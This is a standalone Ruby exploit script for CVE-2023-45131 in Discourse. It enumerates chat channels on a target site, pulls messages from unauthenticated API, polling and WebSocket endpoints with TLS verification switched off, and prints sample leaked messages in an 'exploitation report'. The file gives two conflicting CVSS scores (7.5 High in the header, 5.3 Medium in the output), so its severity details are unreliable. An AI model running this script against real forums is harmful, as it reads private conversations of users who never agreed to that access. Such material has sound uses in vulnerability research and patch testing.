#!/usr/bin/env ruby
# CVE-2023-45131: Discourse Unauthenticated Chat Message Access
# CVSS: 7.5 (High)
# Affected: Discourse < 3.1.1 stable, < 3.2.0.beta2
# Description: Information disclosure vulnerability allowing unauthenticated access to new chat messages
# Author: @ibrahimsql  https://x.com/ibrahmsql

require 'net/http'
require 'uri'
require 'json'
require 'openssl'
require 'base64'

class CVE202345131
  def initialize(target_url)
    @target_url = target_url.chomp('/')
    @results = []
    @chat_channels = []
    @leaked_messages = []
  end

  def run_exploit
    puts "\n[*] Testing CVE-2023-45131: Discourse Unauthenticated Chat Message Access"
    puts "[*] Target: #{@target_url}"
    puts "[*] CVSS Score: 5.3 (Medium)"
    puts "[*] Affected: Discourse < 3.1.1 stable, < 3.2.0.beta2\n"

    # Step 1: Check if chat plugin is enabled
    unless chat_plugin_enabled?
      puts "[-] Chat plugin not detected or not enabled"
      return generate_report
    end

    puts "[+] Chat plugin detected"

    # Step 2: Enumerate chat channels
    enumerate_chat_channels

    # Step 3: Test unauthenticated access to chat messages
    test_unauthenticated_chat_access

    # Step 4: Test message polling endpoints
    test_chat_polling_endpoints

    # Step 5: Test WebSocket chat connections
    test_websocket_chat_access

    generate_report
  end

  private

  def chat_plugin_enabled?
    # Check for chat plugin indicators
    endpoints_to_check = [
      '/chat',
      '/chat/api/channels',
      '/chat/channels',
      '/plugins/chat'
    ]

    endpoints_to_check.each do |endpoint|
      uri = URI("#{@target_url}#{endpoint}")
      
      begin
        response = make_request(uri)
        
        if response && response.code.to_i != 404
          # Check response content for chat indicators
          if response.body.include?('chat') || 
             response.body.include?('discourse-chat') ||
             response.body.include?('chat-channel') ||
             response.body.include?('chat-message')
            return true
          end
        end
      rescue => e
        puts "[!] Error checking #{endpoint}: #{e.message}"
      end
    end

    false
  end

  def enumerate_chat_channels
    puts "[*] Enumerating chat channels..."
    
    # Common chat API endpoints
    chat_endpoints = [
      '/chat/api/channels',
      '/chat/api/channels.json',
      '/chat/channels.json',
      '/chat/api/me/channels',
      '/chat/api/channels/public'
    ]

    chat_endpoints.each do |endpoint|
      uri = URI("#{@target_url}#{endpoint}")
      
      begin
        response = make_request(uri)
        
        if response && response.code.to_i == 200
          begin
            data = JSON.parse(response.body)
            
            if data.is_a?(Hash) && data['channels']
              data['channels'].each do |channel|
                @chat_channels << {
                  id: channel['id'],
                  name: channel['title'] || channel['name'],
                  slug: channel['slug'],
                  endpoint: endpoint
                }
                puts "[+] Found chat channel: #{channel['title'] || channel['name']} (ID: #{channel['id']})"
              end
            elsif data.is_a?(Array)
              data.each do |channel|
                @chat_channels << {
                  id: channel['id'],
                  name: channel['title'] || channel['name'],
                  slug: channel['slug'],
                  endpoint: endpoint
                }
                puts "[+] Found chat channel: #{channel['title'] || channel['name']} (ID: #{channel['id']})"
              end
            end
          rescue JSON::ParserError
            # Not JSON, check for HTML indicators
            if response.body.include?('chat-channel') || response.body.include?('data-chat-channel-id')
              puts "[+] Chat channels detected in HTML response"
              extract_channels_from_html(response.body)
            end
          end
        end
      rescue => e
        puts "[!] Error enumerating channels from #{endpoint}: #{e.message}"
      end
    end

    puts "[*] Found #{@chat_channels.length} chat channels"
  end

  def extract_channels_from_html(html)
    # Extract channel IDs from HTML
    channel_ids = html.scan(/data-chat-channel-id=["']?(\d+)["']?/)
    channel_names = html.scan(/data-chat-channel-title=["']?([^"']+)["']?/)
    
    channel_ids.each_with_index do |id_match, index|
      channel_id = id_match[0]
      channel_name = channel_names[index] ? channel_names[index][0] : "Channel #{channel_id}"
      
      @chat_channels << {
        id: channel_id,
        name: channel_name,
        slug: nil,
        endpoint: 'html_extraction'
      }
      puts "[+] Extracted chat channel: #{channel_name} (ID: #{channel_id})"
    end
  end

  def test_unauthenticated_chat_access
    puts "[*] Testing unauthenticated access to chat messages..."
    
    @chat_channels.each do |channel|
      channel_id = channel[:id]
      
      # Test various message access endpoints
      message_endpoints = [
        "/chat/api/channels/#{channel_id}/messages",
        "/chat/api/channels/#{channel_id}/messages.json",
        "/chat/channels/#{channel_id}/messages",
        "/chat/#{channel_id}/messages",
        "/chat/api/channels/#{channel_id}",
        "/chat/api/channels/#{channel_id}.json"
      ]

      message_endpoints.each do |endpoint|
        uri = URI("#{@target_url}#{endpoint}")
        
        begin
          response = make_request(uri)
          
          if response && response.code.to_i == 200
            begin
              data = JSON.parse(response.body)
              
              if data.is_a?(Hash) && (data['messages'] || data['chat_messages'])
                messages = data['messages'] || data['chat_messages']
                
                if messages.any?
                  puts "[!] VULNERABLE: Unauthenticated access to #{messages.length} messages in channel #{channel[:name]}"
                  
                  @leaked_messages << {
                    channel: channel,
                    endpoint: endpoint,
                    message_count: messages.length,
                    messages: messages.first(5) # Store first 5 messages as proof
                  }
                  
                  @results << {
                    vulnerability: 'CVE-2023-45131',
                    severity: 'MEDIUM',
                    description: 'Unauthenticated access to chat messages',
                    channel: channel[:name],
                    endpoint: endpoint,
                    message_count: messages.length,
                    impact: 'Information disclosure of private chat messages'
                  }
                end
              end
            rescue JSON::ParserError
              # Check for HTML content with messages
              if response.body.include?('chat-message') || response.body.include?('message-content')
                puts "[!] POTENTIAL: Chat messages may be accessible via HTML at #{endpoint}"
                
                @results << {
                  vulnerability: 'CVE-2023-45131',
                  severity: 'LOW',
                  description: 'Potential unauthenticated access to chat messages via HTML',
                  channel: channel[:name],
                  endpoint: endpoint,
                  impact: 'Potential information disclosure'
                }
              end
            end
          end
        rescue => e
          puts "[!] Error testing #{endpoint}: #{e.message}"
        end
      end
    end
  end

  def test_chat_polling_endpoints
    puts "[*] Testing chat polling endpoints..."
    
    # Test polling endpoints that might leak new messages
    polling_endpoints = [
      '/chat/api/channels/me/unread',
      '/chat/api/me/channels/unread',
      '/chat/api/notifications',
      '/chat/api/updates',
      '/chat/api/poll',
      '/message-bus/poll'
    ]

    polling_endpoints.each do |endpoint|
      uri = URI("#{@target_url}#{endpoint}")
      
      begin
        response = make_request(uri)
        
        if response && response.code.to_i == 200
          begin
            data = JSON.parse(response.body)
            
            if data.is_a?(Hash) && (data['messages'] || data['notifications'] || data['updates'])
              puts "[!] POTENTIAL: Polling endpoint accessible without authentication: #{endpoint}"
              
              @results << {
                vulnerability: 'CVE-2023-45131',
                severity: 'LOW',
                description: 'Unauthenticated access to chat polling endpoint',
                endpoint: endpoint,
                impact: 'Potential information disclosure via polling'
              }
            end
          rescue JSON::ParserError
            # Ignore non-JSON responses
          end
        end
      rescue => e
        puts "[!] Error testing polling endpoint #{endpoint}: #{e.message}"
      end
    end
  end

  def test_websocket_chat_access
    puts "[*] Testing WebSocket chat access..."
    
    # Check for WebSocket endpoints
    websocket_endpoints = [
      '/message-bus/',
      '/chat/socket',
      '/socket.io/',
      '/ws/chat'
    ]

    websocket_endpoints.each do |endpoint|
      uri = URI("#{@target_url}#{endpoint}")
      
      begin
        response = make_request(uri)
        
        if response && (response.code.to_i == 101 || response.code.to_i == 200)
          puts "[!] POTENTIAL: WebSocket endpoint accessible: #{endpoint}"
          
          @results << {
            vulnerability: 'CVE-2023-45131',
            severity: 'LOW',
            description: 'WebSocket chat endpoint accessible',
            endpoint: endpoint,
            impact: 'Potential real-time message access'
          }
        end
      rescue => e
        # WebSocket connections may fail with standard HTTP requests
      end
    end
  end

  def make_request(uri)
    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl = (uri.scheme == 'https')
    http.verify_mode = OpenSSL::SSL::VERIFY_NONE
    http.read_timeout = 10
    http.open_timeout = 10
    
    request = Net::HTTP::Get.new(uri.request_uri)
    request['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    request['Accept'] = 'application/json, text/html, */*'
    
    http.request(request)
  rescue => e
    puts "[!] Request failed: #{e.message}"
    nil
  end

  def generate_report
    puts "\n" + "="*60
    puts "CVE-2023-45131 EXPLOITATION REPORT"
    puts "="*60
    puts "Target: #{@target_url}"
    puts "Scan Time: #{Time.now}"
    puts "Chat Channels Found: #{@chat_channels.length}"
    puts "Vulnerabilities Found: #{@results.length}"
    puts "Messages Leaked: #{@leaked_messages.length}"
    
    if @results.any?
      puts "\n[!] VULNERABILITIES DETECTED:"
      @results.each_with_index do |result, index|
        puts "\n#{index + 1}. #{result[:vulnerability]} - #{result[:severity]}"
        puts "   Description: #{result[:description]}"
        puts "   Endpoint: #{result[:endpoint]}"
        puts "   Impact: #{result[:impact]}"
        puts "   Channel: #{result[:channel]}" if result[:channel]
        puts "   Messages: #{result[:message_count]}" if result[:message_count]
      end
      
      if @leaked_messages.any?
        puts "\n[!] LEAKED MESSAGE SAMPLES:"
        @leaked_messages.each do |leak|
          puts "\nChannel: #{leak[:channel][:name]}"
          puts "Endpoint: #{leak[:endpoint]}"
          puts "Total Messages: #{leak[:message_count]}"
          puts "Sample Messages:"
          leak[:messages].each_with_index do |msg, idx|
            puts "  #{idx + 1}. #{msg['message'] || msg['content'] || msg.to_s[0..100]}"
          end
        end
      end
    else
      puts "\n[+] No CVE-2023-45131 vulnerabilities detected"
    end
    
    puts "\n" + "="*60
    
    {
      target: @target_url,
      cve: 'CVE-2023-45131',
      vulnerable: @results.any?,
      severity: @results.any? ? @results.map { |r| r[:severity] }.max : 'NONE',
      channels_found: @chat_channels.length,
      vulnerabilities: @results,
      leaked_messages: @leaked_messages.length
    }
  end
end

# Run the exploit if called directly
if __FILE__ == $0
  if ARGV.length != 1
    puts "Usage: ruby CVE-2023-45131.rb <target_url>"
    puts "Example: ruby CVE-2023-45131.rb https://discourse.example.com"
    exit 1
  end
  
  target_url = ARGV[0]
  exploit = CVE202345131.new(target_url)
  result = exploit.run_exploit
  
  exit(result[:vulnerable] ? 1 : 0)
end